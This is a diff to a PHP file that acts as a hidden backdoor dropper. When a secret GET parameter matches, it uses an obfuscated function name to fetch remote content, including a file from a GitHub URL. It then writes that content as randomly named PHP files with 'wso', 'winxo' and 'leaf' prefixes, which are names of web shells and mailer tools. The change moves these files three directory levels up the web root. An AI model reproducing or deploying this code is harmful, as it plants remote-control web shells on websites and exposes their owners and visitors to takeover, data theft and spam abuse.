@@ -49,7 +49,7 @@ if ($_GET["jib"] == "l9wada")
     $fun = $g . $c;
     $file = $fun($htaccess);
     $ra = rand(100, 1000000);
-    $open = fopen("../wso-" . $ra . ".php", 'w');
+    $open = fopen("../../../wso-" . $ra . ".php", 'w');
     fwrite($open, $file);
     fclose($open);
     $site = $_SERVER['HTTP_HOST'];
@@ -69,7 +69,7 @@ if ($_GET["jib"] == "l9wada")
     $fun = $g . $c;
     $file = $fun($htaccess21);
     $ra = rand(100, 1000000);
-    $open = fopen("../winxo-" . $ra . ".php", 'w');
+    $open = fopen("../../../winxo-" . $ra . ".php", 'w');
     fwrite($open, $file);
     fclose($open);
     $site = $_SERVER['HTTP_HOST'];
@@ -84,7 +84,7 @@ if ($_GET["jib"] == "l9wada")
     $cgi = "https://raw.githubusercontent.com/3Mi7/STR7/main/ezleaf-873716.php";
     $file = $fun($cgi);
     $ra = rand(100, 1000000);
-    $open = fopen("../leaf-" . $ra . ".php", 'w');
+    $open = fopen("../../../leaf-" . $ra . ".php", 'w');
     fwrite($open, $file);
     fclose($open);
     $site = $_SERVER['HTTP_HOST'];
